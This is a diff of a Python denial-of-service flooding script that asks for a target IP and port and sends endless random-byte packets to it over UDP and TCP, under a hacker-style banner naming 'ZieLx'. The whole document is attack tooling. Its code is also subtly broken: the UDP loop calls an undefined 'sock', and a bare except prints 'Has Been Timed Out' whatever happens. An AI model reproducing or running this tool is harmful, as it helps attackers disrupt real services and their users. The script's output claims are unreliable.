@@ -5,7 +5,7 @@ import threading
 import os , sys , codecs
 
 os.system("clear")
-print(""""\033[95m
+print("""\033[95m
  __    _____  _  _  ____ 
 (  )  (  _  )( \/ )( ___)
  )(__  )(_)(  \  /  )__) 
@@ -39,42 +39,41 @@ print("""
 (  _ \(  _ \(  _  )(_   )
  )(_) ))(_) ))(_)(  / /_ 
 (____/(____/(_____)(____)
-""") 
-print("""\033[97m======================================
-\033[91m[ • ] Code : ZieLx
-\033[91m[ + ] Join King Community
-[ $ ] Anak Kontol Mau Rename
-\033[97m======================================""")
+\n""") 
+print("""
+\033[95 [•] Code : ZieLx
+ [$] METHOD : UDP - TCP
+ [#] DC : Z1#7872
 
-ip =str(input("\033[96m[ 1 ] Ip Target :\033[91m "))
-port =int(input("\033[96m[ 2 ] Port Target : \033[91m"))
-times =int(input("\033[96m[ 3 ] Times :\033[91m "))
-size =int(input("\033[96m[ 4 ] Size :\033[91m "))
-choice =str(input("\033[96m[ 5 ] Ready? (y/n) :\033[91m "))
+ip =str(input("\033[96m[1] Ip Target :\033[91m "))
+port =int(input("\033[96m[2] Port Target : \033[91m"))
+times =int(input("\033[96m[3] Times :\033[91m "))
+size =int(input("\033[96m[4] Size :\033[91m "))
+choice =str(input("\033[96m[5] Ready? (y/n) :\033[91m "))
 
 def run():
-	size = os.urandom(1025)
+	data = os.urandom(1025)
 	i = random.choice(("[•]","[+]","[$]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr =(str(ip),int(port))
 			for x in range(times):
-				sock.sendto(size,addr)
+				sock.sendto(data,addr)
 				print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
 		except:
 					print("\033[31m[•] %s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
 					
 def run2():
-	size = os.urandom(999)
+	data = os.urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
-			s.send(size)
+			s.send(data)
 			for x in range(times):
-				s.send(size)
+				s.send(data)
 			print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
 		except:
 			s.close()
